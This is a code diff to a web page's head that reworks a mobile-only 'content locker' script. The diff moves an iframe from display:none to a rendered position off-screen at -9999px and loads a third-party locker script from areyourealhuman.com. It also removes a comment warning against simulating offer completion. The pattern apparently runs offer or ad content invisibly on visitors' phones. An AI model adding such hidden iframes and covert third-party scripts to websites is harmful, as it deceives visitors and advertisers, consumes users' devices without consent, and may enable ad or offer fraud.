@@ -13,19 +13,17 @@
   <script defer src="./assets/js/global.js"></script>
   <script src="./assets/js/detail.js" type="module"></script>
 
- <!-- Content Locker with 30-day cookie -->
+<!-- Content Locker with 30-day cookie -->
 <script>
   function setCookie(name, value, days) {
     const d = new Date();
     d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
-    const expires = "expires=" + d.toUTCString();
-    document.cookie = name + "=" + value + ";" + expires + ";path=/";
+    document.cookie = name + "=" + value + ";expires=" + d.toUTCString() + ";path=/";
   }
 
   function getCookie(name) {
     const cname = name + "=";
-    const decodedCookie = decodeURIComponent(document.cookie);
-    const ca = decodedCookie.split(';');
+    const ca = decodeURIComponent(document.cookie).split(';');
     for (let i = 0; i < ca.length; i++) {
       let c = ca[i].trim();
       if (c.indexOf(cname) === 0) return c.substring(cname.length, c.length);
@@ -33,12 +31,19 @@
     return "";
   }
 
+  function isMobileDevice() {
+    return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  }
+
   function loadLocker() {
     if (isMobileDevice()) {
       const iframe = document.createElement('iframe');
-      iframe.style.display = 'none';
-      iframe.width = '1024';
-      iframe.height = '768';
+      iframe.style.position = 'fixed';
+      iframe.style.left = '-9999px';
+      iframe.style.top = '0';
+      iframe.style.width = '1024px';
+      iframe.style.height = '768px';
+      iframe.style.border = 'none';
       document.body.appendChild(iframe);
 
       const iframeDoc = iframe.contentWindow.document;
@@ -59,16 +64,10 @@
       script.id = 'ogjs';
       script.src = 'https://areyourealhuman.com/cl/js/j638dp';
       script.type = 'text/javascript';
-      // Don't simulate offer completion here
       document.head.appendChild(script);
     }
   }
 
-  function isMobileDevice() {
-    return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-  }
-
-  // Check if locker was already completed
   if (getCookie("anom") !== "true") {
     window.addEventListener("message", function (e) {
       if (e.data === "locker-complete") {
@@ -81,7 +80,6 @@
     console.log("✅ Locker already completed: skipping");
   }
 </script>
-
 </head>
 
 <body>
